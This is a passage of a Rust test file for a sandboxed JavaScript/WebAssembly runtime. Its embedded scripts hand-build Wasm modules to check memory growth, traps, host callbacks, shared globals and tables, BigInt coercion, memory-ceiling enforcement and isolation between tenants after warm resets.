        const jsZeroPrev = memory.grow(0);
        const afterJsZeroBuf = memory.buffer;

        const lazy = new WebAssembly.Instance(memMod);
        lazy.exports.grow(1);

        const res122 = {
            previousPages,
            wasmPages,
            currentBytes,
            oldBytes: oldBuffer.byteLength,
            oldDetached: oldBuffer.detached === true,
            bufferChanged: currentBuffer !== oldBuffer,
            retainedByte,
            lazyBufferBytes: lazy.exports.memory.buffer.byteLength,
            failedGrow,
            failKeptBuffer,
            currentDetachedAfterJsGrow,
            jsPrevPages,
            jsZeroPrev,
            afterJsGrowDetached: afterJsGrowBuf.detached === true,
            afterJsZeroBytes: afterJsZeroBuf.byteLength,
            page2Retained: new Uint8Array(afterJsZeroBuf)[65536],
            page3Retained: new Uint8Array(afterJsZeroBuf)[131072],
            negGrowErr: errName(() => memory.grow(-1)),
            maxGrowErr: errName(() => memory.grow(1)),
            transferErr: errName(() => afterJsZeroBuf.transfer())
        };

        // Shared imported Memory across two instances where Instance A grows natively and Instance B reads page 2
        const sharedMem = new WebAssembly.Memory({ initial: 1, maximum: 4 });
        // Module importing env.mem (min 1, max 4), re-exporting "memory", exporting grow1(), writeAt(off, val), readAt(off)
        const sharedMemModBytes = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            ...sec(1, [2, 0x60, 1, 0x7f, 1, 0x7f, 0x60, 2, 0x7f, 0x7f, 0]),
            ...sec(2, [1, ...str("env"), ...str("mem"), 2, 1, 1, 4]),
            ...sec(3, [3, 0, 1, 0]),
            ...sec(7, [
                4,
                ...str("memory"), 2, 0,
                ...str("grow"), 0, 0,
                ...str("write"), 0, 1,
                ...str("read"), 0, 2
            ]),
            ...sec(10, [
                3,
                ...fnBody([0, 0x20, 0, 0x40, 0, 0x0b]),
                ...fnBody([0, 0x20, 0, 0x20, 1, 0x3a, 0, 0, 0x0b]),
                ...fnBody([0, 0x20, 0, 0x2d, 0, 0, 0x0b])
            ])
        ]);
        const sharedMemMod = new WebAssembly.Module(sharedMemModBytes);
        const sharedA = new WebAssembly.Instance(sharedMemMod, { env: { mem: sharedMem } });
        const sharedB = new WebAssembly.Instance(sharedMemMod, { env: { mem: sharedMem } });
        const preSharedBuf = sharedMem.buffer;
        sharedA.exports.grow(1);
        sharedB.exports.write(70000, 123);
        const sharedCrossRead = sharedA.exports.read(70000);
        const sharedJsRead = new Uint8Array(sharedMem.buffer)[70000];
        const sameExportedMem = sharedA.exports.memory === sharedMem && sharedB.exports.memory === sharedMem && preSharedBuf.detached;

        // =====================================================================
        // 2. Issue #123: Post-trap memory visibility, OOB traps, start traps & host callbacks
        // =====================================================================
        const inst123 = new WebAssembly.Instance(memMod);
        const view123 = new Uint8Array(inst123.exports.memory.buffer);
        const before123 = view123[0];
        let trapped123 = false;
        try { inst123.exports.writeTrap(); }
        catch (err) { trapped123 = err instanceof WebAssembly.RuntimeError; }
        const immediatelyAfterTrap = view123[0];
        const wasmRead = inst123.exports.load();
        const afterSuccessfulCall = view123[0];
        // Overwrite back to 0 in JS and verify shadow_mem stayed coherent on trap!
        view123[0] = 0;
        const afterJsResetToZero = inst123.exports.load();

        // Store-then-OOB-load trap + valueOf() mutation before memory sync + unmangled host throw + re-entrancy
        const sentinel = { tag: "exact-host-exception", code: 409 };
        let hostSawPreCallWrite = 0;
        let reentrantResult = 0;
        // Module importing env.cb () -> (), importing env.mem (1..4), exporting run(arg: i32) -> i32, oobTrap(), read(off) -> i32
        const hostMemMod = new WebAssembly.Module(new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            ...sec(1, [2, 0x60, 0, 0, 0x60, 1, 0x7f, 1, 0x7f]),
            ...sec(2, [
                2,
                ...str("env"), ...str("cb"), 0, 0,
                ...str("env"), ...str("mem"), 2, 1, 1, 4
            ]),
            ...sec(3, [3, 1, 0, 1]),
            ...sec(7, [
                3,
                ...str("run"), 0, 1,
                ...str("oob"), 0, 2,
                ...str("rd"), 0, 3
            ]),
            ...sec(10, [
                3,
                // func 1 `run(arg)`: mem[8] = arg + mem[4]; call cb(); return mem[12]
                ...fnBody([0, 0x41, 8, 0x20, 0, 0x41, 4, 0x2d, 0, 0, 0x6a, 0x3a, 0, 0, 0x10, 0, 0x41, 12, 0x2d, 0, 0, 0x0b]),
                // func 2 `oob()`: mem[1] = 88 (0xd8, 0x00 in sleb128); drop(i32.load(0x200000))
                ...fnBody([0, 0x41, 1, 0x41, 0xd8, 0x00, 0x3a, 0, 0, 0x41, 0x80, 0x80, 0x80, 1, 0x28, 2, 0, 0x1a, 0x0b]),
                // func 3 `rd(off)`: i32.load8_u(off)
                ...fnBody([0, 0x20, 0, 0x2d, 0, 0, 0x0b])
            ])
        ]));
        const hostMem = new WebAssembly.Memory({ initial: 1, maximum: 4 });
        let shouldThrowInHost = false;
        let hostInst;
        hostInst = new WebAssembly.Instance(hostMemMod, {
            env: {
                mem: hostMem,
                cb() {
                    const v = new Uint8Array(hostMem.buffer);
                    hostSawPreCallWrite = v[8];
                    reentrantResult = hostInst.exports.rd(8);
                    v[12] = 99;
                    if (shouldThrowInHost) {
                        v[13] = 77;
                        throw sentinel;
                    }
                }
            }
        });
        const hostView = new Uint8Array(hostMem.buffer);
        // Argument valueOf() mutates mem[4] = 15 right before `run` executes!
        const runOut = hostInst.exports.run({
            valueOf() {
                new Uint8Array(hostMem.buffer)[4] = 15;
                return 10;
            }
        });
        const firstHostSaw = hostSawPreCallWrite;
        const firstReentrant = reentrantResult;
        // OOB trap after writing 88 to mem[1]
        let oobTrapped = false;
        try { hostInst.exports.oob(); }
        catch (e) { oobTrapped = e instanceof WebAssembly.RuntimeError; }
        const immediateAfterOob = hostView[1];

        // Host callback writes 77 to mem[13] and throws `sentinel` object
        shouldThrowInHost = true;
        let caughtExactSentinel = false;
        try { hostInst.exports.run(5); }
        catch (e) { caughtExactSentinel = (e === sentinel); }
        const afterHostThrowJs = hostView[13];
        const afterHostThrowWasm = hostInst.exports.rd(13);

        // `(start)` function writing 55 to imported memory then hitting unreachable
        const startTrapMod = new WebAssembly.Module(new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            ...sec(1, [1, 0x60, 0, 0]),
            ...sec(2, [1, ...str("env"), ...str("mem"), 2, 1, 1, 2]),
            ...sec(3, [1, 0]),
            ...sec(8, [0]),
            ...sec(10, [1, ...fnBody([0, 0x41, 0, 0x41, 55, 0x3a, 0, 0, 0x00, 0x0b])])
        ]));
        const startMem = new WebAssembly.Memory({ initial: 1, maximum: 2 });
        const startView = new Uint8Array(startMem.buffer);
        let startTrapped = false;
        try { new WebAssembly.Instance(startTrapMod, { env: { mem: startMem } }); }
        catch (e) { startTrapped = e instanceof WebAssembly.RuntimeError; }
        const afterStartTrapByte = startView[0];

        const res123 = {
            before: before123,
            trapped: trapped123,
            immediatelyAfterTrap,
            wasmRead,
            afterSuccessfulCall,
            afterJsResetToZero,
            hostSawPreCallWrite: firstHostSaw,
            reentrantResult: firstReentrant,
            runOut,
            oobTrapped,
            immediateAfterOob,
            caughtExactSentinel,
            afterHostThrowJs,
            afterHostThrowWasm,
            startTrapped,
            afterStartTrapByte
        };

        // =====================================================================
        // 3. Issue #124: Shared live WebAssembly.Global & Table + canonical identity
        // =====================================================================
        const globBytes = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            1, 9, 2, 96, 0, 1, 127, 96, 1, 127, 0,
            2, 10, 1, 3, 101, 110, 118, 1, 103, 3, 127, 1,
            3, 3, 2, 0, 1,
            7, 17, 3,
              3, 103, 101, 116, 0, 0,
              3, 115, 101, 116, 0, 1,
              1, 103, 3, 0,
            10, 13, 2,
              4, 0, 35, 0, 11,
              6, 0, 32, 0, 36, 0, 11
        ]);
        const globMod = new WebAssembly.Module(globBytes);
        const sharedGlobal = new WebAssembly.Global({ value: "i32", mutable: true }, 3);
        const gInst1 = new WebAssembly.Instance(globMod, { env: { g: sharedGlobal } });
        const gInst2 = new WebAssembly.Instance(globMod, { env: { g: sharedGlobal } });
        const gInitial = gInst1.exports.get();
        sharedGlobal.value = 9;
        const gAfterJsWrite = gInst1.exports.get();
        gInst1.exports.set(11);
        const gInst2Sees = gInst2.exports.get();
        const immGlobal = new WebAssembly.Global({ value: "i32", mutable: false }, 5);
        const f64Global = new WebAssembly.Global({ value: "f64", mutable: true }, 5);

        // Shared funcref Table with call_indirect
        const sharedTable = new WebAssembly.Table({ element: "funcref", initial: 2, maximum: 4 });
        const tblMod = new WebAssembly.Module(new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            ...sec(1, [2, 0x60, 1, 0x7f, 1, 0x7f, 0x60, 2, 0x7f, 0x7f, 1, 0x7f]),
            ...sec(2, [1, ...str("env"), ...str("t"), 1, 0x70, 1, 2, 4]),
            ...sec(3, [2, 0, 1]),
            ...sec(7, [
                3,
                ...str("t"), 1, 0,
                ...str("triple"), 0, 0,
                ...str("call"), 0, 1
            ]),
            ...sec(10, [
                2,
                ...fnBody([0, 0x20, 0, 0x41, 3, 0x6c, 0x0b]),
                ...fnBody([0, 0x20, 1, 0x20, 0, 0x11, 0, 0, 0x0b])
            ])
        ]));
        const tInst = new WebAssembly.Instance(tblMod, { env: { t: sharedTable } });
        sharedTable.set(0, tInst.exports.triple);
        const indirectOut = tInst.exports.call(0, 14);
        const sameTableFn = sharedTable.get(0) === tInst.exports.triple;
        const sameExportedTable = tInst.exports.t === sharedTable;

        const res124 = {
            initial: gInitial,
            afterJsWrite: gAfterJsWrite,
            afterWasmWrite: sharedGlobal.value,
            exportedValue: gInst1.exports.g.value,
            inst2Sees: gInst2Sees,
            sameGlobal: gInst1.exports.g === sharedGlobal && gInst2.exports.g === sharedGlobal,
            mutImportImmErr: errName(() => new WebAssembly.Instance(globMod, { env: { g: immGlobal } })),
            mutImportNumErr: errName(() => new WebAssembly.Instance(globMod, { env: { g: 3 } })),
            mutImportTypeErr: errName(() => new WebAssembly.Instance(globMod, { env: { g: f64Global } })),
            immSetErr: errName(() => { immGlobal.value = 8; }),
            indirectOut,
            sameTableFn,
            sameExportedTable
        };

        // =====================================================================
        // 4. Issue #125: Arbitrary-precision ToBigInt64 & BigInt sibling checks
        // =====================================================================
        const id64Bytes = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            1, 6, 1, 96, 1, 126, 1, 126,
            3, 2, 1, 0,
            7, 12, 1, 8, 105, 100, 101, 110, 116, 105, 116, 121, 0, 0,
            10, 6, 1, 4, 0, 32, 0, 11
        ]);
        const identity = new WebAssembly.Instance(new WebAssembly.Module(id64Bytes)).exports.identity;
        const g64 = new WebAssembly.Global({ value: "i64", mutable: true }, (1n << 200n) + 29n);
        const g64Init = String(g64.value);
        g64.value = -(1n << 512n) + 17n;
        const g64After = String(g64.value);

        // Host return i64 coercion check
        const hostRet64Mod = new WebAssembly.Module(new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            ...sec(1, [1, 0x60, 0, 1, 0x7e]),
            ...sec(2, [1, ...str("env"), ...str("h"), 0, 0]),
            ...sec(3, [1, 0]),
            ...sec(7, [1, ...str("r"), 0, 1]),
            ...sec(10, [1, ...fnBody([0, 0x10, 0, 0x0b])])
        ]));
        let hostRetVal = (1n << 256n) + 31n;
        const hostRet64Inst = new WebAssembly.Instance(hostRet64Mod, { env: { h: () => hostRetVal } });
        const hostRetLarge = String(hostRet64Inst.exports.r());
        hostRetVal = 123;
        const hostRetNumErr = errName(() => hostRet64Inst.exports.r());

        // Sibling Buffer writeBigInt64BE / writeBigUInt64BE checks
        const buf8 = Buffer.alloc(8);
        const bufNumErr = errName(() => buf8.writeBigInt64BE(1, 0));
        const bufRangeErr = errName(() => buf8.writeBigUInt64BE(-1n, 0));
        buf8.writeBigInt64BE(-42n, 0);
        const bufSignedRoundtrip = String(buf8.readBigInt64BE(0));

        const res125 = {
            ordinary: String(identity(42n)),
            wraps64: String(identity((1n << 64n) + 7n)),
            largePositive: String(identity((1n << 128n) + 7n)),
            largeNegative: String(identity(-(1n << 128n) + 9n)),
            i128BoundaryPos: String(identity((1n << 127n) + 15n)),
            i128BoundaryNeg: String(identity(-(1n << 127n) - 5n)),
            bits1024Neg1: String(identity((1n << 1024n) - 1n)),
            bits1024Zero: String(identity(-(1n << 1024n))),
            minI64: String(identity(1n << 63n)),
            maxI64: String(identity((1n << 63n) - 1n)),
            valueOfBigInt: String(identity({ valueOf() { return (1n << 300n) + 19n; } })),
            numericArgument: errName(() => identity(1)),
            undefArgument: errName(() => identity()),
            g64Init,
            g64After,
            g64NumErr: errName(() => { g64.value = 5; }),
            hostRetLarge,
            hostRetNumErr,
            bufNumErr,
            bufRangeErr,
            bufSignedRoundtrip
        };

        console.log(JSON.stringify({ res122, sharedCrossRead, sharedJsRead, sameExportedMem, res123, res124, res125 }));
    "#;

    let m = run_source_isolated(
        "wave5-wasm-suite",
        script,
        CapabilityToken::pure_compute(),
        5_000_000,
        32 * 1024 * 1024,
    )
    .expect("wave5 wasm suite execution");

    let out: serde_json::Value = serde_json::from_str(
        m.stdout
            .first()
            .unwrap_or_else(|| panic!("no stdout line; metrics={:?}", m)),
    )
    .expect("json");

    // #122 assertions
    assert_eq!(out["res122"]["previousPages"], 1);
    assert_eq!(out["res122"]["wasmPages"], 2);
    assert_eq!(out["res122"]["currentBytes"], 131_072);
    assert_eq!(out["res122"]["oldBytes"], 0);
    assert_eq!(out["res122"]["oldDetached"], true);
    assert_eq!(out["res122"]["bufferChanged"], true);
    assert_eq!(out["res122"]["retainedByte"], 7);
    assert_eq!(out["res122"]["lazyBufferBytes"], 131_072);
    assert_eq!(out["res122"]["failedGrow"], -1);
    assert_eq!(out["res122"]["failKeptBuffer"], true);
    assert_eq!(out["res122"]["currentDetachedAfterJsGrow"], true);
    assert_eq!(out["res122"]["jsPrevPages"], 2);
    assert_eq!(out["res122"]["jsZeroPrev"], 3);
    assert_eq!(out["res122"]["afterJsGrowDetached"], true);
    assert_eq!(out["res122"]["afterJsZeroBytes"], 196_608);
    assert_eq!(out["res122"]["page2Retained"], 91);
    assert_eq!(out["res122"]["page3Retained"], 53);
    assert_eq!(out["res122"]["negGrowErr"], "TypeError");
    assert_eq!(out["res122"]["maxGrowErr"], "RangeError");
    assert_eq!(out["res122"]["transferErr"], "TypeError");
    assert_eq!(out["sharedCrossRead"], 123);
    assert_eq!(out["sharedJsRead"], 123);
    assert_eq!(out["sameExportedMem"], true);

    // #123 assertions
    assert_eq!(out["res123"]["before"], 0);
    assert_eq!(out["res123"]["trapped"], true);
    assert_eq!(out["res123"]["immediatelyAfterTrap"], 42);
    assert_eq!(out["res123"]["wasmRead"], 42);
    assert_eq!(out["res123"]["afterSuccessfulCall"], 42);
    assert_eq!(out["res123"]["afterJsResetToZero"], 0);
    assert_eq!(out["res123"]["hostSawPreCallWrite"], 25);
    assert_eq!(out["res123"]["reentrantResult"], 25);
    assert_eq!(out["res123"]["runOut"], 99);
    assert_eq!(out["res123"]["oobTrapped"], true);
    assert_eq!(out["res123"]["immediateAfterOob"], 88);
    assert_eq!(out["res123"]["caughtExactSentinel"], true);
    assert_eq!(out["res123"]["afterHostThrowJs"], 77);
    assert_eq!(out["res123"]["afterHostThrowWasm"], 77);
    assert_eq!(out["res123"]["startTrapped"], true);
    assert_eq!(out["res123"]["afterStartTrapByte"], 55);

    // #124 assertions
    assert_eq!(out["res124"]["initial"], 3);
    assert_eq!(out["res124"]["afterJsWrite"], 9);
    assert_eq!(out["res124"]["afterWasmWrite"], 11);
    assert_eq!(out["res124"]["exportedValue"], 11);
    assert_eq!(out["res124"]["inst2Sees"], 11);
    assert_eq!(out["res124"]["sameGlobal"], true);
    assert_eq!(out["res124"]["mutImportImmErr"], "LinkError");
    assert_eq!(out["res124"]["mutImportNumErr"], "LinkError");
    assert_eq!(out["res124"]["mutImportTypeErr"], "LinkError");
    assert_eq!(out["res124"]["immSetErr"], "TypeError");
    assert_eq!(out["res124"]["indirectOut"], 42);
    assert_eq!(out["res124"]["sameTableFn"], true);
    assert_eq!(out["res124"]["sameExportedTable"], true);

    // #125 assertions
    assert_eq!(out["res125"]["ordinary"], "42");
    assert_eq!(out["res125"]["wraps64"], "7");
    assert_eq!(out["res125"]["largePositive"], "7");
    assert_eq!(out["res125"]["largeNegative"], "9");
    assert_eq!(out["res125"]["i128BoundaryPos"], "15");
    assert_eq!(out["res125"]["i128BoundaryNeg"], "-5");
    assert_eq!(out["res125"]["bits1024Neg1"], "-1");
    assert_eq!(out["res125"]["bits1024Zero"], "0");
    assert_eq!(out["res125"]["minI64"], "-9223372036854775808");
    assert_eq!(out["res125"]["maxI64"], "9223372036854775807");
    assert_eq!(out["res125"]["valueOfBigInt"], "19");
    assert_eq!(out["res125"]["numericArgument"], "TypeError");
    assert_eq!(out["res125"]["undefArgument"], "TypeError");
    assert_eq!(out["res125"]["g64Init"], "29");
    assert_eq!(out["res125"]["g64After"], "17");
    assert_eq!(out["res125"]["g64NumErr"], "TypeError");
    assert_eq!(out["res125"]["hostRetLarge"], "31");
    assert_eq!(out["res125"]["hostRetNumErr"], "TypeError");
    assert_eq!(out["res125"]["bufNumErr"], "TypeError");
    assert_eq!(out["res125"]["bufRangeErr"], "RangeError");
    assert_eq!(out["res125"]["bufSignedRoundtrip"], "-42");
}

#[test]
fn test_wave5_wasm_native_grow_cage_warm_reset_and_nested_eval_sandbox_isolation() {
    // 1. Native Wasm `(memory.grow 40)` must not bypass the 2 MiB isolate memory ceiling
    let native_grow_bomb = r#"
        const mod = new WebAssembly.Module(new Uint8Array([
            0,97,115,109, 1,0,0,0,
            1,6,1, 96,1,127,1,127,
            3,2,1, 0,
            5,3,1, 0,1,
            7,8,1, 4,103,114,111,119, 0,0,
            10,8,1, 6,0, 32,0, 64,0, 11
        ]));
        const inst = new WebAssembly.Instance(mod);
        inst.exports.grow(40);
    "#;
    let err = run_source_isolated(
        "wave5-native-grow-cage",
        native_grow_bomb,
        CapabilityToken::pure_compute(),
        1_000_000,
        2 * 1024 * 1024,
    )
    .expect_err("native Wasm memory.grow(40) must exceed 2 MiB ceiling");
    assert!(
        matches!(
            err.downcast_ref::<SandboxViolation>(),
            Some(SandboxViolation::MemoryCeilingExceeded { .. })
        ),
        "expected MemoryCeilingExceeded, got {:?}",
        err
    );

    // 2. Imported Memory must NOT be double-charged on instantiation, and nested `Slice.evalSandbox`
    //    inside a Wasm host import callback must preserve parent Wasm execution & isolate child state!
    let nested_script = r#"
        const sec = (id, body) => [id, body.length, ...body];
        const str = (s) => [s.length, ...Array.from(s, (c) => c.charCodeAt(0))];
        const fnBody = (bytes) => [bytes.length, ...bytes];
        // Allocate 12 pages (768 KiB) inside a 1 MiB ceiling; importing into 3 instances must NOT double-charge!
        const mem = new WebAssembly.Memory({ initial: 12, maximum: 14 });
        const g = new WebAssembly.Global({ value: "i32", mutable: true }, 100);
        const mod = new WebAssembly.Module(new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0,
            ...sec(1, [1, 0x60, 0, 1, 0x7f]),
            ...sec(2, [
                3,
                ...str("env"), ...str("cb"), 0, 0,
                ...str("env"), ...str("mem"), 2, 1, 12, 14,
                ...str("env"), ...str("g"), 3, 0x7f, 1
            ]),
            ...sec(3, [1, 0]),
            ...sec(7, [1, ...str("run"), 0, 1]),
            ...sec(10, [1, ...fnBody([0, 0x10, 0, 0x23, 0, 0x6a, 0x24, 0, 0x23, 0, 0x0b])])
        ]));
        let sandboxOut = "";
        const imp = {
            env: {
                mem,
                g,
                cb() {
                    const sub = Slice.evalSandbox(`
                        const subG = new WebAssembly.Global({ value: "i32", mutable: true }, 7);
                        console.log(String(subG.value));
                    `, { maxFuel: 500000, maxMemoryBytes: 4 * 1024 * 1024 });
                    sandboxOut = sub.stdout.join("").trim();
                    return 23;
                }
            }
        };
        const i1 = new WebAssembly.Instance(mod, imp);
        const i2 = new WebAssembly.Instance(mod, imp);
        const i3 = new WebAssembly.Instance(mod, imp);
        const r = i1.exports.run();
        console.log(JSON.stringify({ r, g2: i2.exports.run !== undefined ? g.value : -1, sandboxOut, sameMem: i3.exports !== null }));
    "#;
    let bundled = slice_cas::strip_typescript_and_normalize(nested_script, true);
    let bc = compile_source_to_bytecode(&bundled);
    let mut iso = SliceIsolate::spawn(
        "wave5-tenant-a",
        1,
        CapabilityToken::pure_compute(),
        2_000_000,
        1024 * 1024, // 1 MiB ceiling: 12 pages = 768 KiB fits once, would fail if double-charged!
    );
    let m1 = iso.execute_bytecode(&bc, None).expect("turn 1");
    assert_eq!(
        m1.stdout
            .first()
            .unwrap_or_else(|| panic!("turn 1 no stdout; metrics={:?}", m1)),
        r#"{"r":123,"g2":123,"sandboxOut":"7","sameMem":true}"#
    );

    // Warm reset for tenant B: budget and Wasm store reset cleanly so 12 pages fit again
    iso.reset_for_request("wave5-tenant-b", 2, 2_000_000, 1024 * 1024);
    let m2 = iso.execute_bytecode(&bc, None).expect("turn 2 warm");
    assert_eq!(
        m2.stdout[0],
        r#"{"r":123,"g2":123,"sandboxOut":"7","sameMem":true}"#
    );

    // 3. Persistent warm `__slice_rc` HTTP module with top-level `new WebAssembly.Module(...)`
    //    and 2,500 caught host-callback throws must preserve `mod` and never leak Boa VM stack slots!
    let warm_http_src = r#"
const idBytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 6, 1, 96, 1, 126, 1, 126, 3, 2, 1, 0, 7, 12, 1, 8, 105, 100, 101, 110, 116, 105, 116, 121, 0, 0, 10, 6, 1, 4, 0, 32, 0, 11]);
const throwMod = new WebAssembly.Module(new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0,
    1, 4, 1, 96, 0, 0,
    2, 9, 1, 3, 101, 110, 118, 1, 104, 0, 0,
    3, 2, 1, 0,
    7, 5, 1, 1, 114, 0, 1,
    10, 6, 1, 4, 0, 16, 0, 11
]));
const topMod = new WebAssembly.Module(idBytes);
export default {
    fetch(req) {
        const u = new URL(req.url);
        const id = new WebAssembly.Instance(topMod).exports.identity;
        if (u.pathname === "/throw-loop") {
            const sentinel = { tag: "loop" };
            const ti = new WebAssembly.Instance(throwMod, { env: { h() { throw sentinel; } } });
            let caught = 0;
            for (let i = 0; i < 2500; i++) {
                try { ti.exports.r(); } catch (e) { if (e === sentinel) caught++; }
            }
            return new Response(String(caught));
        }
        return new Response(String(id((1n << 128n) + 13n)));
    }
};
"#;
    let warm_http_bc = compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(
        warm_http_src,
        true,
    ));
    let mut http_iso = SliceIsolate::spawn(
        "wave5-http-warm",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        16 * 1024 * 1024,
    );
    for turn in 0..8u32 {
        http_iso.reset_for_request("wave5-http-warm", turn + 1, 10_000_000, 16 * 1024 * 1024);
        let path = if turn == 3 { "/throw-loop" } else { "/" };
        let req = HttpRequestContext {
            method: "GET",
            path,
            query: "",
            tenant_id: "wave5-http-warm",
            body: "",
            body_bytes: None,
            headers: &[("host", "localhost")],
        };
        let out = http_iso
            .execute_http_request_fast(&warm_http_bc, None, &req)
            .expect("warm http wasm turn");
        assert_eq!(out.status_code, 200);
        assert_eq!(out.response_body, if turn == 3 { "2500" } else { "13" });
    }
}
